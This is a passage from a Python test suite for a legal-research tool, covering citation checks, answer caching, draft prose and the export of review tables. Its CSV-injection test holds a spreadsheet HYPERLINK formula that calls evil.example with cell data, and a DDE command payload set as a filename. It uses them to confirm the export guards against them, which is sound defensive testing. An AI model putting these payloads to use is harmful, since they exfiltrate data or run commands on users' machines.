          "...while c3, SHARED with a kept sentence, survives -- which is why the index "
          "records every sentence that cites a span, not just the first")
    check(any("DROPPED CITATIONS" in t for t in _oc["critic"]["trace"]),
          "...and the drop is in the trace")

    # The index itself, from the REAL builder on a REAL summary -- not a fixture, because
    # the thing being checked is that the ids it records are the ids that get emitted.
    _ixev = _rq.evidence(_q)
    _ixout = _rq.answer(_q, model=_rq.quoting_model(tuple(_s for _s, _o in _ixev)),
                        available=("azure",))
    _ix = {}
    _ixcits = _citations_from_summary(_ixout.summary, _ixev, index_out=_ix)
    check(bool(_ix), f"the index is populated from a real summary ({_ix})")
    _flat = {cid for ids in _ix.values() for cid in ids}
    check(_flat == {c["id"] for c in _ixcits},
          f"...and names EXACTLY the citations that were emitted -- no id the index "
          f"claims is missing from citations[], and none emitted is unattributed "
          f"({sorted(_flat)} vs {sorted(c['id'] for c in _ixcits)})")
    check(all(isinstance(k, int) and k >= 1 for k in _ix),
          "...keyed by 1-based sentence position, which is what the s1..sN claim ids use")
    check(_citations_from_summary(_ixout.summary, _ixev) == _ixcits,
          "...and asking for the index changes nothing about what is returned")

    # ── the one setting, default OFF ───────────────────────────────────────
    check(_crit.CRITIC_ENABLED_ENV == "CRITIC_ENABLED",
          f"the setting is named once, in checker/critic.py ({_crit.CRITIC_ENABLED_ENV})")
    _was = _os.environ.pop("CRITIC_ENABLED", None)
    try:
        check(not _critic_enabled(),
              "**OFF by default**: a layer that can only subtract does not subtract from "
              "every answer until a model has been watched working live (B1)")
        for _on in ("true", "1", "yes", "ON"):
            _os.environ["CRITIC_ENABLED"] = _on
            check(_critic_enabled(), f"...and ON for {_on!r}")
        for _off in ("false", "0", "", "no"):
            _os.environ["CRITIC_ENABLED"] = _off
            check(not _critic_enabled(), f"...and OFF for {_off!r}")
        # With it ON, a task that produces no cited statutory sentences SAYS the critic
        # did not run, rather than leaving a clean reply that reads as approval.
        _os.environ["CRITIC_ENABLED"] = "true"
        _cvctx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00")
        _rv = by_name()["conversation.send"].run(
            {"text": "Please review this contract.", "task_override": "REVIEW_CONTRACT",
             "test_data": "fixture"}, _cvctx)
        _env_note = " ".join(b["text"] for b in _rv["envelope"]["text_blocks"])
        check("critic" in str(_rv).lower() or _rv["envelope"]["task"] == "REVIEW_CONTRACT",
              "a non-research task still answers with the critic enabled")
    finally:
        _os.environ.pop("CRITIC_ENABLED", None)
        if _was is not None:
            _os.environ["CRITIC_ENABLED"] = _was
    check(not _critic_enabled(), "...and the suite leaves it OFF again")

    # ══ O5: bounded decomposition ═══════════════════════════════════════════
    from checker import decompose as _dc
    _CQ = ("What is the quorum for a meeting of the Board, and how many must be held "
           "each year?")
    _SUBS = ["What is the quorum for a meeting of the Board?",
             "How many meetings of the Board must be held each year?"]

    def _splitting(_origins):
        def call(prompt):
            if "Split the question" in prompt:
                return "1. " + _SUBS[0] + "\n2. " + _SUBS[1] + "\n"
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _o5 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_splitting)
    _dr = by_name()["ask"].run({"question": _CQ, "decompose": "true"}, _o5)
    check(_dr.get("sub_questions") == 2 and _dr.get("bound") == 4,
          f"a compound question is split and the BOUND is reported "
          f"({_dr.get('sub_questions')} of {_dr.get('bound')})")
    check([p["question"] for p in _dr["parts"]] == _SUBS,
          "...the parts are kept in the ORDER they were asked")
    check(len(_dr.get("sub_run_ids") or []) == 2,
          "...each sub-question is a REAL ask with its own run, so it went through the "
          "same retrieval, verifier and cache as a whole question would")
    check(_dr.get("run_id"), "...and the decomposition itself is a run")
    _used = [p for p in _dr["parts"] if p["used"]]
    check(_used and all(p["citations"] for p in _used),
          "...and every part used in the synthesis carries a citation")
    if _dr["status"] == "PARTIAL":
        check(bool(_dr["unanswered"]) and _dr["unanswered"][0]["question"] in _SUBS,
              f"a sub-question that did not answer is NAMED, never silently dropped "
              f"({_dr['unanswered'][0]['question'][:40]!r})")
        check(_dr["unanswered"][0]["why"],
              "...with the reason, which is the part a lawyer acts on")
        check(_dr["unanswered"][0]["question"] not in _dr["answer"],
              "...and its text is not in the joined answer")
    else:
        check(_dr["status"] == "ANSWERED" and not _dr["unanswered"],
              f"...or everything answered, and nothing is listed as missing "
              f"({_dr['status']})")

    # The bound, end to end: nine proposals must cost four asks, not nine.
    _asked = []

    def _greedy(_origins):
        def call(prompt):
            if "Split the question" in prompt:
                return "\n".join(f"{i}. sub-question {i}?" for i in range(1, 10))
            _asked.append(1)
            return _rq.quoting_model(_srcs)(prompt)
        return call

    _o5b = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                   model_for=_greedy)
    _br = by_name()["ask"].run({"question": _CQ, "decompose": "true"}, _o5b)
    check(_br.get("sub_questions") == 4,
          f"**nine proposed sub-questions run FOUR** ({_br.get('sub_questions')})")
    check(len(_br.get("sub_run_ids") or []) == 4,
          f"...and four runs, not nine: the bound caps SPEND, not just the report "
          f"({len(_br.get('sub_run_ids') or [])})")
    check(_br.get("proposed") == 4 and _br.get("bound") == _dc.MAX_SUBQUESTIONS,
          "...and the report names the bound it applied")

    # No model to split with: the question is answered whole, not refused.
    _o5c = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30")
    _nr = _ask_decomposed(_q, {"question": _q}, _o5c)
    check("parts" not in _nr or _nr.get("sub_questions", 1) == 1,
          "with NO model to propose a split, the question is answered WHOLE -- the "
          "failure costs the split and never the answer")
    check(not _affirmed(None) and _affirmed("true"),
          "decompose is off unless explicitly asked for")
    check("decompose" in {f.name for f in by_name()["ask"].inputs},
          "...and it is a FIELD on ask, not a new verb: a new read-only verb would become "
          "an MCP tool and need the policy allowlist changed in three files")

    # ══ O9: the answer cache ════════════════════════════════════════════════
    from checker import answer_cache as _ac
    _o9 = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    _a1 = by_name()["ask"].run({"question": _q}, _o9)
    check(_a1.get("status") == "ANSWERED" and not _a1.get("cached"),
          f"the first ask is answered and NOT cached ({_a1.get('status')})")
    _a2 = by_name()["ask"].run({"question": _q}, _o9)
    check(_a2.get("cached") is True,
          "the second ask of the SAME question is served from the cache")
    check(_a2.get("answer") == _a1.get("answer")
          and [c["id"] for c in _a2.get("citations") or []]
              == [c["id"] for c in _a1.get("citations") or []],
          "...with the same answer and the same citations")
    check("re-verifies" in str(_a2.get("cache_note")),
          f"...and the note says the citations were RE-READ, not that it was recent "
          f"({str(_a2.get('cache_note'))[:50]!r})")
    _s1 = cache_stats(_o9)
    check(_s1["hits"] == 1 and _s1["misses"] == 1 and _s1["hit_rate"] == 0.5,
          f"**the hit rate is reported** ({_s1['hit_rate']})")

    # Asking it differently is the same question; asking a different one is not.
    by_name()["ask"].run({"question": "  what is the QUORUM for a meeting of the Board "},
                         _o9)
    check(cache_stats(_o9)["hits"] == 2,
          "case and surrounding space do not make a new question")
    by_name()["ask"].run({"question": "How many Board meetings must be held each year?"},
                         _o9)
    check(cache_stats(_o9)["misses"] == 2,
          "...while a different question misses, rather than being served the first "
          "answer")

    # ── THE GATE: a stored answer whose law moved is NOT served ─────────────
    _stale_ctx = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                         model_for=lambda _o: _rq.quoting_model(_srcs))
    by_name()["ask"].run({"question": _q}, _stale_ctx)
    _key = _ac.lookup_key(question=_q, task="RESEARCH_QUESTION", as_of="2026-10-01")
    _row = _stale_ctx.store.read_cache_entry(_key)
    check(_row is not None, "the answer was stored")
    # Rewrite the stored citation's sha256: the corpus file no longer hashes to it, which
    # is exactly what a real amendment to the section would do.
    _moved = [dict(c, sha256="0" * 64) for c in _row["citations"]]
    _stale_ctx.store.write_cache_entry(dict(_row, citations=_moved,
                                            content_key=_ac.content_key(
                                                _key, _ac.provision_hashes(_moved))))
    _a3 = by_name()["ask"].run({"question": _q}, _stale_ctx)
    check(not _a3.get("cached"),
          "**a stored answer whose cited provision has CHANGED is not served** -- the "
          "question is answered again")
    _s2 = cache_stats(_stale_ctx)
    check(_s2["stale"] == 1,
          f"...and it is counted as STALE, apart from a miss: the law moved, which is not "
          f"a cache fault ({_s2})")
    check("corpus change and not a cache fault" in _s2["note"],
          "...and the note says so, because that number is what shows the re-verification "
          "gate does anything")

    # ── what is never cached ───────────────────────────────────────────────
    _nf = Context(store=_MB(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    by_name()["ask"].run({"question": _q, "company_facts": {"paid_up_capital": "1"}}, _nf)
    check(_nf.store.read_cache_stats()["hits"] + _nf.store.read_cache_stats()["misses"]
          == 0,
          "an ask carrying COMPANY FACTS is not looked up at all: the key does not carry "
          "the facts, so a hit would serve one company's answer to another's question")
    check("no store" in cache_stats(Context())["error"],
          "the hit rate with no store says so rather than reporting a rate of nothing")
    check(_ac.Stats().to_dict()["hit_rate"] is None,
          "...and an unqueried cache has NO rate, which is not a rate of zero")
    check("cache.stats" not in {v.name for v in VERBS},
          "the hit rate is NOT a verb: every read-only verb becomes an MCP tool with no "
          "opt-out, and a cache hit rate is an operator's number, not an agent capability")

    # ── job 3c: the model writes the prose, and the same rule judges it ────
    # Stubs only. The gate never calls a model: a suite that needed one would be a suite
    # that fails when the region is unconfirmed, which is most of the time.
    from checker import draft_prose as _dp
    from checker import draft_templates as _dtpl
    _FAKE3C = "Section 42 of the Companies Act requires a special resolution for this."

    def _fabricating(_origins):
        return lambda prompt: ("1. This note sets out what was found. [c1]\n"
                               f"2. {_FAKE3C}\n")

    # The research turn needs the REAL quoting model so its citations name the corpus file
    # they were read from; only the DRAFT turn is served by the fabricating stub. Reusing
    # one stub for both produced citations with no source, and the prose was then refused
    # for having nothing to clear -- a fixture fault that read exactly like a real one.
    _p3 = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00",
                  model_for=lambda _o: _rq.quoting_model(_srcs))
    _b3, _n3 = _draft_prose("research_memo", _src,
                            Context(store=_MB(), model_for=_fabricating))
    check(_n3 == "" and len(_b3) == 2,
          f"the prose writer returns the model's sentences ({_n3[:40]!r})")
    check(_dp.build_prompt("research_memo", _src).count("<source") >= 1,
          "...from a prompt whose quotes sit in DELIMITED blocks, each cleared against "
          "the corpus file it was read from")
    check(_q not in _dp.build_prompt("client_email", {"findings": [
              {"rule_id": "R", "clause": "C", "kind": "POTENTIAL_ISSUE", "detail": "d"}]}),
          "...and the user's message is not in the prompt: the model is shown findings, "
          "so it can only write about findings")

    # End to end: the model's fabricated law is dropped by the SAME admit rule.
    _p3.documents.update(_cctx2.documents)
    _pr1 = by_name()["conversation.send"].run({"text": _q}, _p3)
    _pcid = _pr1["conversation_id"]
    _p3.model_for = _fabricating        # from here, the stub writes the prose
    if _draft_source(_pcid, _p3)[0] is None:
        check(False, "a stub-served research turn is a memo source")
    else:
        _pr2 = by_name()["conversation.send"].run(
            {"conversation_id": _pcid, "text": "Draft a memo for the file about this."},
            _p3)
        check(_pr2.get("prose_note") == "",
              f"prose was written, so there is no note ({_pr2.get('prose_note')!r})")
        check(len(_pr2.get("dropped_claims") or []) == 1,
              f"**the MODEL's uncited legal claim is DROPPED** end to end "
              f"({len(_pr2.get('dropped_claims') or [])})")
        _pv = by_name()["draft.versions"].run(
            {"draft_id": _pr2["draft_id"]}, _p3)["versions"][0]
        check(_FAKE3C not in _pv["body"]
              and all(_FAKE3C not in (sl.get("value") or "") for sl in _pv["slots"]),
              "...and is in no part of the stored version")
        check(any(sl["type"] == "MODEL_SUGGESTION" and sl["blocks_approval"]
                  for sl in _pv["slots"]),
              "...while the surviving sentence BLOCKS approval, so no model-written draft "
              "is approvable without a person")

    # A model that raises gives the note and a draft that still stands.
    def _exploding(_origins):
        def boom(prompt):
            raise TimeoutError("the deployment did not answer")
        return boom

    _b4, _n4 = _draft_prose("research_memo", _src,
                            Context(store=_MB(), model_for=_exploding))
    check(_b4 == [] and _n4.startswith(_dp.NO_PROSE_PREFIX) and "TimeoutError" in _n4,
          f"**a model that RAISES gives 'prose not generated', not FAILED** ({_n4[:50]!r})")
    _still = _dtpl.research_memo(_src, prose=_b4)
    check(any(s.slot_type == "SOURCE_QUOTE" for s in _still.slots),
          "...and the draft is still built from the run's citations")

    # The email's facts are MATTER, so D3 decides whether it can have prose at all.
    check(_dp.sensitivity_of("client_email") == _dp.MATTER
          and _dp.sensitivity_of("research_memo") == _dp.PUBLIC,
          "an email's facts are client data and a memo's are corpus quotes -- which is "
          "why one of them can be refused on residency while the other is not")

    # The email template, from a real review_contract run in the same thread.
    _ectx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00")
    _rc = by_name()["conversation.send"].run(
        {"text": "Please review this contract against our standard.",
         "task_override": "REVIEW_CONTRACT", "test_data": "fixture"}, _ectx)
    _ecid = _rc["conversation_id"]
    _et, _es, _erid = _draft_source(_ecid, _ectx)
    if _et is None:
        check(False, f"a REVIEW_CONTRACT turn is an email's source run "
                     f"(got none; run={_rc.get('run_id')})")
    else:
        check(_et == "client_email", f"a REVIEW_CONTRACT turn is an email's source ({_et})")
        _er = by_name()["conversation.send"].run(
            {"conversation_id": _ecid,
             "text": "draft an email to the client about this review",
             "prose": [{"text": "Clause 4 is void for want of consideration.",
                        "citation_ids": []}]}, _ectx)
        check(_er["envelope"]["task"] == "DRAFT" and _er.get("template") == "client_email",
              f"...and the user's own words reach the email template "
              f"({_er['envelope']['task']}/{_er.get('template')})")
        check(len(_er.get("dropped_claims") or []) == 1,
              "...where an uncited 'is void' claim is dropped by the same rule")
        _ev1 = by_name()["draft.versions"].run(
            {"draft_id": _er["draft_id"]}, _ectx)["versions"][0]
        check(not any(sl["type"] == "SOURCE_QUOTE" for sl in _ev1["slots"]),
              "...and the email states NO law, because a contract review holds none")
        check("not statements of law" in _ev1["body"],
              "...and says so in the stored body, where a forward carries it")

    # ── citation.get re-reads; it does not trust the stored envelope ────────
    _cg = by_name()["citation.get"].run(
        {"citation_id": _c1["id"], "conversation_id": _cr["conversation_id"]}, _cctx2)
    check(_cg.get("reverified") is True and "byte-matches" in _cg["reverified_note"],
          f"citation.get re-reads the corpus and says so ({_cg.get('reverified')})")
    check(_cg["citation"]["quote"] == _c1["quote"],
          "...returning the citation in full for the source panel")
    # A bent citation that somehow IS stored must come back marked, not presented as good.
    _st2 = _cctx2.store
    _mid = [m for m in _st2.read_messages(_cr["conversation_id"])
            if m["role"] == "assistant"][0]["message_id"]
    _st2.set_message_envelope(_mid, dict(_ce, citations=[_bent]))
    _cg2 = by_name()["citation.get"].run(
        {"citation_id": "bent", "conversation_id": _cr["conversation_id"]}, _cctx2)
    check(_cg2.get("reverified") is False and "NOT present" in _cg2["reverified_note"],
          f"a bent citation found in a STORED envelope is returned marked "
          f"reverified=false, never as a good one ({_cg2.get('reverified')})")
    check("nothing may rest on it" in _cg2["note"],
          "...and the note says what that means")

    # ══ H4: review_table.create / .status / .export ══════════════════════════
    from checker import review_grid as _rg
    from gateway.jobs import MemoryQueue as _MQ2
    _hctx = Context(store=_MB(), queue=_MQ2(),
                    clock=lambda: "2026-10-01T00:00:00+00:00")
    _hV = by_name()
    _d1 = _hV["documents.upload"].run(
        {"text": "MUTUAL NDA\n3. Governed by the laws of India.\n", "name": "nda.txt"},
        _hctx)["document_id"]
    _d2 = _hV["documents.upload"].run(
        {"text": "SUPPLY AGREEMENT with no governing law clause.\n", "name": "supply.txt"},
        _hctx)["document_id"]
    _cols = [{"name": "governing law", "kind": "text", "question": "Which law governs?"},
             {"name": "term end", "kind": "date", "question": "When does it expire?"}]

    # write verbs stay off MCP
    for _wv in ("review_table.create",):
        check(_wv in write_verbs() and f"{MCP_NAMESPACE}.{_wv}" not in {t.name for t in mcp},
              f"{_wv} WRITES and is kept off MCP by mcp_tools()")
    for _rv in ("review_table.status", "review_table.export"):
        check(_rv not in write_verbs()
              and f"{MCP_NAMESPACE}.{_rv}" in {t.name for t in mcp},
              f"{_rv} is read-only and reaches MCP")

    _cr = _hV["review_table.create"].run(
        {"name": "NDA diligence", "document_ids": [_d1, _d2], "columns": _cols}, _hctx)
    check(_cr.get("cells") == 4 and len(_cr["scheduled"]["enqueued"]) == 4,
          f"create materialises 4 cells and enqueues one job per cell ({_cr.get('cells')})")
    check(_cr["estimated_cost_inr"] is None and "UNPRICED" in _cr["cost_note"],
          "...and the cost is UNPRICED, not a number: every cell is a call that has not "
          "happened, and a figure would be a guess wearing a currency symbol")
    _gid = _cr["grid_id"]

    # ── the cost guard, before anything is enqueued ─────────────────────────
    _big = _hV["review_table.create"].run(
        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
         "columns": _cols * 3}, _hctx)
    check(_big.get("code") == "GRID_TOO_LARGE",
          f"a grid above the cap is REFUSED ({_big.get('code')})")
    check("606 cells" in _big["detail"] and str(MAX_GRID_CELLS) in _big["detail"],
          f"...and the refusal names the CELL COUNT and the CAP ({_big['detail'][:70]})")
    check("separate run" in _big["detail"] or "separate model call" in _big["detail"],
          "...and says why a big table is a bill and a queue depth, not just a big table")
    _before = len(_MQ2().__dict__.get("jobs", []) or [])
    _q3 = _MQ2()
    _hctx3 = Context(store=_MB(), queue=_q3, clock=lambda: "2026-10-01T00:00:00+00:00")
    _hV["review_table.create"].run(
        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
         "columns": _cols * 3}, _hctx3)
    check(_hctx3.store.read_grid_cells("x") == [] and not getattr(_q3, "jobs", []),
          "...and NOTHING was enqueued: a half-enqueued grid bills the user for the part "
          "that ran and leaves them without a table")
    check(MAX_GRID_CELLS == 500, f"the cap is a declared number ({MAX_GRID_CELLS})")
    _exact = _hV["review_table.create"].run(
        {"name": "at the cap", "document_ids": [("%064x" % i) for i in range(250)],
         "columns": _cols}, Context(store=_MB(), queue=_MQ2()))
    check(_exact.get("cells") == 500, f"a grid exactly AT the cap is allowed ({_exact.get('cells')})")

    # ── bad input ───────────────────────────────────────────────────────────
    for _bad, _why in (({"name": "", "document_ids": [_d1], "columns": _cols}, "no name"),
                       ({"name": "n", "document_ids": [], "columns": _cols}, "no documents"),
                       ({"name": "n", "document_ids": [_d1], "columns": []}, "no columns"),
                       ({"name": "n", "document_ids": [_d1],
                         "columns": [{"name": "c", "kind": "colour", "question": "q?"}]},
                        "an unknown column kind"),
                       ({"name": "n", "document_ids": [_d1],
                         "columns": [{"name": "c", "kind": "text", "question": ""}]},
                        "a column with no question")):
        _r = _hV["review_table.create"].run(_bad, Context(store=_MB(), queue=_MQ2()))
        check(_r.get("status") == "REFUSED", f"create refuses {_why} ({_r.get('code')})")
    check(_hV["review_table.create"].run(
              {"name": "n", "document_ids": [_d1], "columns": _cols},
              Context())["code"] == "NO_STORE",
          "create with no store is refused: a review table is durable work")

    # ── status: PENDING is not a finding ────────────────────────────────────
    _st = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
    check(_st["cells"] == 4 and _st["findings"] == 0 and not _st["complete"],
          f"a fresh grid has 4 cells and 0 FINDINGS ({_st['findings']}/{_st['cells']})")
    check(_st["by_state"]["PENDING"] == 4, "...all four PENDING")
    check(len(_st["cells_detail"]) == 4, "...and every cell is listed")
    check(_hV["review_table.status"].run({"grid_id": "nope"}, _hctx)["code"] == "NOT_FOUND",
          "an unknown grid is NOT_FOUND, never an empty table")

    # Answer two cells, one FOUND and one NOT_FOUND. One priced, one UNPRICED, so the
    # running total below has both kinds to deal with.
    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d1,
                                 "column_name": "governing law", "state": "FOUND",
                                 "value": "India",
                                 "quote": "Governed by the laws of India",
                                 "provider": "azure", "cost_inr": 0.0412,
                                 "cost_note": "priced from reported tokens"})
    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d2,
                                 "column_name": "governing law", "state": "NOT_FOUND",
                                 "reason": "the agreement names no governing law at all",
                                 "provider": "azure", "cost_inr": None,
                                 "cost_note": "UNPRICED: no verified price for this "
                                              "deployment"})
    _st2 = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
    check(_st2["findings"] == 2 and _st2["by_state"]["PENDING"] == 2,
          f"two answers are two findings; the unrun cells stay PENDING ({_st2['findings']})")

    # ── the running total, and what it refuses to pretend ──────────────────
    _sp = _st2["spend"]
    check(_sp["total_inr"] == 0.0412 and _sp["priced_cells"] == 1,
          f"**.status carries the grid's running total** ({_sp['total_inr']})")
    check(_sp["unpriced_cells"] == 1 and _sp["pending_cells"] == 2,
          f"...with the cells it does NOT include, counted separately "
          f"({_sp['unpriced_cells']} unpriced, {_sp['pending_cells']} pending)")
    check(_sp["is_lower_bound"] and "HIGHER" in _sp["note"],
          "...and it says in words that the true figure is higher, because a total that "
          "quietly dropped an UNPRICED call would read as the bill")
    check("0" not in str(_sp["unpriced_cells"]) or _sp["total_inr"] != 0,
          "...and the UNPRICED cell contributed nothing rather than being counted as 0.00")
    _fresh = _hV["review_table.status"].run(
        {"grid_id": _hV["review_table.create"].run(
            {"name": "unrun", "document_ids": [_d1],
             "columns": [{"name": "c", "kind": "text", "question": "q?"}]},
            _hctx)["grid_id"]}, _hctx)["spend"]
    check(_fresh["total_inr"] is None and _fresh["note"].startswith("UNPRICED"),
          f"a table where nothing has run has NO total -- UNPRICED, not Rs.0.00 "
          f"({_fresh['total_inr']!r})")

    # ── export: words in every cell, and no formula can run ────────────────
    _ex = _hV["review_table.export"].run({"grid_id": _gid}, _hctx)
    import csv as _csv, io as _io
    _rows = [r for r in _csv.reader(_io.StringIO(_ex["csv"]))]
    check(_rows[0] == ["document", "governing law", "term end"],
          f"the header is the document plus each column ({_rows[0]})")
    check(any("nda.txt" in r[0] for r in _rows[1:]),
          "a document renders by NAME, not by its sha256")
    _empty = [(i, j) for i, r in enumerate(_rows[1:], 1)
              for j, v in enumerate(r) if not str(v).strip()]
    check(not _empty, f"no exported cell is empty ({_empty})")
    check("NOT FOUND" in _ex["csv"] and "PENDING" in _ex["csv"],
          "...and NOT FOUND and PENDING read differently")
    check(_ex["filename"].endswith(".csv") and _ex["content_type"] == "text/csv",
          f"the export names a filename and a content type ({_ex['filename']})")
    check(_ex["findings"] == 2 and _ex["cells"] == 4,
          "...and reports findings separately from cells")

    # CSV injection, end to end through the verb.
    _evil = _hV["documents.upload"].run(
        {"text": "NDA\n=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs.\n",
         "name": "=cmd|'/c calc'!A1.docx"}, _hctx)["document_id"]
    _eg = _hV["review_table.create"].run(
        {"name": "evil", "document_ids": [_evil],
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs?"}]}, _hctx)["grid_id"]
    _hctx.store.write_grid_cell(
        {"grid_id": _eg, "document_id": _evil, "column_name": "governing law",
         "state": "FOUND", "value": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")",
         "quote": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs",
         "cost_note": "no billed call: written directly by this suite"})
    _ec = _hV["review_table.export"].run({"grid_id": _eg}, _hctx)["csv"]
    check(not any(v.startswith(("=", "+", "@")) for r in _csv.reader(_io.StringIO(_ec))
                  for v in r),
          "no exported value can run as a formula -- the cell value AND the filename are "
          "both guarded")
    check("'=HYPERLINK" in _ec, "...the guard is a single leading quote, verbatim after it")
    check(_rg.csv_safe("-50000") == "'-50000",
          "a negative amount is guarded too, and exports as text -- a number that reads "
          "oddly beats an export that runs")

    # ══ H4 END TO END: the worker actually drains a grid ═════════════════════
    # Required by job 2b. Not a unit test of the runner -- the real queue, the real worker
    # loop, the real store, and the real verbs.
    import csv as _csv2, io as _io2
    from gateway.jobs import MemoryQueue as _Q
    from gateway.worker import run_one as _run_once
    from gateway import worker as _wk

    _DOCS = {
        "a" * 64: "NDA ONE. 3. Governed by the laws of India. 4. Expires 2029-03-31.",
        "b" * 64: "NDA TWO. 3. Governed by the laws of Singapore. 4. No expiry stated.",
        "c" * 64: "SUPPLY AGREEMENT. No governing law clause appears anywhere.",
    }

    def _answerer(_origins=None):
        """A deterministic cell answerer, injected as ctx.model_for would inject a model."""
        def answer(question, kind, text):
            q = question.lower()
            if "law" in q and "govern" in q:
                for seat in ("India", "Singapore"):
                    if f"laws of {seat}" in text:
                        return (seat, f"Governed by the laws of {seat}")
                return None
            if "expire" in q:
                import re as _re
                m = _re.search(r"\d{4}-\d{2}-\d{2}", text)
                return (m.group(0), f"Expires {m.group(0)}") if m else None
            return None
        return answer

    _e2e = Context(store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                   model_for=_answerer)
    for _sha, _txt in _DOCS.items():
        _e2e.documents[_sha] = {"sha256": _sha, "name": f"{_sha[:4]}.txt",
                                "text": _txt, "bytes": len(_txt)}
    _eV = by_name()
    _made = _eV["review_table.create"].run(
        {"name": "NDA diligence", "document_ids": list(_DOCS),
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs this agreement?"},
                     {"name": "term end", "kind": "date",
                      "question": "On what date does it expire?"}]}, _e2e)
    _gid = _made["grid_id"]
    check(_made["cells"] == 6 and len(_made["scheduled"]["enqueued"]) == 6,
          f"a 3x2 table queues 6 cells ({_made['cells']})")
    check(_eV["review_table.status"].run({"grid_id": _gid}, _e2e)["by_state"]["PENDING"]
          == 6, "...and all six start PENDING")

    # THE WORKER DRAINS IT. The real loop, one job at a time, until the queue is empty.
    _handlers = queue_handlers(_e2e)
    _drained = 0
    for _ in range(20):
        _oc = _run_once(queue=_e2e.queue, store=_e2e.store, handlers=_handlers,
                        worker="w1")
        if _oc is None:
            break
        _drained += 1
    check(_drained == 6, f"the worker drained exactly 6 jobs ({_drained})")

    # ── an UNREADABLE model reply becomes NEEDS_LAWYER, never NOT_FOUND ────
    # Through the REAL parser the served path uses, with the model's words as the input.
    from agents.review_grid import Unreadable as _Unread
    check(_parse_cell_reply("VALUE: 3 years\nQUOTE: for a period of three years")
          == ("3 years", "for a period of three years"),
          "the two-line format parses to a value and its quote")
    check(_parse_cell_reply("VALUE: NONE\nQUOTE: ") is None,
          "...and an explicit NONE is None, which is the only route to NOT_FOUND")
    for _bad, _why in (
            ("The document says the term is three years.", "a prose reply"),
            ('{"value": "3 years", "quote": "three years"}', "a JSON reply"),
            ("I'm sorry, I can't help with that.", "a refusal in prose"),
            ("", "an empty reply"),
            ("VALUE:   \nQUOTE: something", "a VALUE: line with nothing on it")):
        try:
            _got = _parse_cell_reply(_bad)
            check(False, f"{_why} raises rather than returning {_got!r} -- returning None "
                         f"is what made this an ABSENCE")
        except _Unread:
            check(True, f"{_why} is Unreadable, NOT None")

    # And end to end, as a cell: the model answers in prose about a document it read.
    def _prose_model(_origins):
        def answer(question, kind, text):
            return _parse_cell_reply("The agreement is governed by Indian law, clause 14.")
        return answer

    _pctx = Context(store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                    model_for=_prose_model)
    _pd = list(_DOCS)[0]
    _pctx.documents[_pd] = {"sha256": _pd, "name": "p.txt", "text": _DOCS[_pd],
                            "bytes": len(_DOCS[_pd])}
    _pg = by_name()["review_table.create"].run(
        {"name": "garbled", "document_ids": [_pd],
         "columns": [{"name": "governing law", "kind": "text",
                      "question": "Which law governs this agreement?"}]}, _pctx)["grid_id"]
    _ph = queue_handlers(_pctx)
    _run_once(queue=_pctx.queue, store=_pctx.store, handlers=_ph, worker="w1")
    _pcell = by_name()["review_table.status"].run({"grid_id": _pg}, _pctx)["cells_detail"][0]
    check(_pcell["state"] == "NEEDS_LAWYER",
          f"a model that answers in PROSE gives NEEDS_LAWYER end to end "
          f"({_pcell['state']})")
    check(_pcell["state"] != "NOT_FOUND",
          "...and NOT NOT_FOUND: the document was read and described, and the old parser "
          "turned that into 'this clause is absent'")
    check("unreadable model reply" in _pcell["reason"],
          f"...with the reason naming it ({_pcell['reason'][:46]!r})")
    check("COULD NOT RUN" not in by_name()["review_table.export"].run(
              {"grid_id": _pg}, _pctx)["csv"],
          "...and it does not export as COULD NOT RUN either, which is FAILED's label: "
          "the call ran")

    # ── THE LEDGER: one debit per cell, read from run_steps ────────────────
    # A cell is a run (`run_id_for_cell` is a uuid5 of its key), so the ledger entry for a
    # cell is its run's step. Read back from the store, not counted from the handler's
    # return: the question is what was PERSISTED.
    from agents.review_grid import run_id_for_cell as _rid
    _entries = []
    for _d in _DOCS:
        for _c in ("governing law", "term end"):
            _run = _e2e.store.read_run(_rid(_gid, _d, _c)) or {}
            _entries += [st for st in (_run.get("steps") or ())
                         if st.get("capability") == "review_grid.cell"]
    check(len(_entries) == 6,
          f"**a 6-cell grid records 6 LEDGER ENTRIES**, one per cell ({len(_entries)})")
    check(all(st.get("cost_note") for st in _entries),
          "...and every one says what it cost or why there is no number")
    check(all(st.get("cost_inr") is None for st in _entries),
          "...here all None, because a stub answerer served them: no billed call was made")
    check(all("not a cost of zero" in st["cost_note"] for st in _entries),
          f"...and each note SAYS that is not a cost of zero "
          f"({_entries[0]['cost_note'][:46]!r})")
    _cellrows = _e2e.store.read_grid_cells(_gid)
    check([r for r in _cellrows if r["cost_note"]] and len(_cellrows) == 6,
          "...and the same note is on the CELL, which is what .status adds up")
    check({st["cost_note"] for st in _entries}
          == {r["cost_note"] for r in _cellrows},
          "...identically: the step and the cell are built from ONE debit, so the two "
          "records cannot drift apart")

    _st = _eV["review_table.status"].run({"grid_id": _gid}, _e2e)
    check(_st["spend"]["total_inr"] is None and _st["spend"]["unpriced_cells"] == 6,
          f"...and a table of unbilled cells has NO total, with all 6 counted as unpriced "
          f"({_st['spend']['total_inr']!r})")
    check(_st["complete"], f"**.status shows the table COMPLETE** ({_st['by_state']})")
